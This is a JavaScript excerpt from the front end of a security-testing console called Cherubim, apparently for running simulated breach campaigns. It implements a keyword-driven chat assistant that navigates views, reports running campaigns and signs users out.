    if (/running|in progress|active campaign|status/.test(m)) { go("#/campaigns"); return run ? "There " + (run === 1 ? "is" : "are") + " <b>" + run + "</b> campaign" + (run === 1 ? "" : "s") + " running. Opening campaigns." : "No campaigns are running right now. Say \"run an assumed breach campaign now\" and I will start one."; }

    if (/sign out|log ?out|logout/.test(m)) { setTimeout(function () { $("#logout").onclick(); }, 600); return "Signing you out and returning to the sign in page."; }

    if (/^(hi|hey|hello|yo|help|what can you|who are you|\?)/.test(m) || m.length < 3) {
      return "I am the Cherubim assistant. I can drive the console for you. Try: <b>run an identity campaign now</b>, <b>show the agent mesh</b>, <b>open findings</b>, <b>coach the affected people</b>, <b>review the executive report</b>, <b>show the audit ledger</b>, <b>show the API</b>, or <b>generate the audit pack</b>.";
    }
    return "I can launch and configure campaigns, show the agent mesh, surface findings, assign blame-free coaching, open any view, and generate reports or the audit pack. Try \"run a cloud campaign now\", \"show the agent mesh\" or \"coach the people who clicked\". What would you like me to do?";
  }

  function setupAssistant() {
    var fab = $("#askFab"), panel = $("#askPanel"), log = $("#askLog"),
        form = $("#askForm"), input = $("#askInput"), x = $("#askX"), sugs = $("#askSugs");
    if (!fab || !panel) return;
    var seeded = false;
    function add(who, html) {
      var d = document.createElement("div");
      d.className = "ask-msg " + who;
      d.innerHTML = html;
      log.appendChild(d); log.scrollTop = log.scrollHeight;
    }
    function seed() {
      if (seeded) return; seeded = true;
      add("bot", "Hello " + (USER.name.split(" ")[0]) + ". I am the Cherubim assistant. Tell me what to do and I will run it.");
      var s = ["Run an assumed breach campaign now", "Show the agent mesh", "Coach the affected people", "Review the executive report"];
      sugs.innerHTML = "";
      s.forEach(function (t) {
        var b = document.createElement("button"); b.textContent = t;
        b.onclick = function () { handle(t); };
        sugs.appendChild(b);
      });
    }
    function open() { panel.classList.add("open"); panel.setAttribute("aria-hidden", "false"); seed(); setTimeout(function () { input.focus(); }, 200); }
    function close() { panel.classList.remove("open"); panel.setAttribute("aria-hidden", "true"); }
    function handle(text) {
      add("me", esc(text));
      var r = assistantReply(text);
      setTimeout(function () { add("bot", r); }, 320);
    }
    fab.onclick = function () { panel.classList.contains("open") ? close() : open(); };
    x.onclick = close;
    form.onsubmit = function (e) {
      e.preventDefault();
      var v = input.value.trim(); if (!v) return;
      input.value = ""; handle(v);
    };
  }
})();
